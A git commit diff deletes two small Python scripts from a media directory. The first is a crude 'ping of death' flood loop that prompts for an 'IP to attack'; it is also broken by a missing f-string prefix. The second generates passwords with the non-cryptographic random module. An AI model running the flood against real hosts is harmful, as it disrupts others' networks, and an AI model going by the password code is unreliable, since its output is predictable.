47e8eaf5ec9206415f541f2260ce946097b1722e
alextoucan-secondary <152742599+alextoucan-secondary@users.noreply.github.com>
2023-12-03 09:22:58 -0600

    Delete media directory

--- media/files/Ping_of_death_.py
+++
@@ -1,6 +0,0 @@
-```
-import os
-ip = input("IP to attack: ")
-while True:
-    os.system("ping {ip} -l 65500 -w 1 -n 1")
-```
--- media/files/passwordgenerator.py
+++
@@ -1,8 +0,0 @@
-import string, random
-while True:
-    characters = list(string.ascii_letters + string.digits)
-    length = int(input("length: "))
-    password = []
-    
-    for i in range(length): password.append(random.choice(characters))
-    print("".join(password))
